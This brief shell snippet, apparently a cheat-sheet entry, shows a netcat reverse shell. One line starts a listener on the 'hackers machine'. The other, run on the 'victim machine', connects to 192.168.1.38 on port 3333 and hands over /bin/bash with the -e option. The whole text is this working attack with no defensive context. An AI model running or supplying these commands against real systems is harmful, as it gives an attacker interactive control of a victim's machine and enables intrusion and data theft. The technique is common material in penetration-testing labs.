# On hackers machine [*1st step]
nc -lvp 3333

# On victim machine 
nc 192.168.1.38 3333 -e /bin/bash
